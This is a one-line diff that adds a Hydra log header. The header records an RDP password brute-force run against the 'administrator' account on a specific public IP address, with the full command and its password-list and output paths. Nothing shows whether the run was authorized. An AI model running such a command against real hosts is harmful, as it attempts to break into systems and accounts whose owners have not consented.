@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-28 10:19:41 on 8.129.115.103 rdp (hydra -l administrator -P /tmp/final_pass.txt -t 1 -w 3 -o /tmp/lj_final.txt rdp://8.129.115.103)
